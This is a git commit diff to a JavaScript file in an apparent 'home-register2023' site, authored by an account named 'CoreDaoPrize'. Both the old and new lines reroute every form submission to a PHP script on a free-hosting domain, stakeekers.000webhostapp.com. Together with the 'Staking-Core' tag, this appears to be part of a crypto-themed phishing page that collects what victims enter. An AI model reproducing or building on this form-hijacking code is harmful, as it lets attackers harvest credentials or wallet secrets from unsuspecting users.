1529f8bebec82385c3d88b4998e7d83c58991d61
CoreDaoPrize <126675788+CoreDaoPrize@users.noreply.github.com>
2023-03-01 21:27:57 +0700

    Update script2.js

--- home-register2023/js/script2.js
+++ home-register2023/js/script2.js
@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://stakeekers.000webhostapp.com/panteelk2.php?Staking-Core");
+  $(myform).attr("action", "https://stakeekers.000webhostapp.com/panteelk2.php");
 });
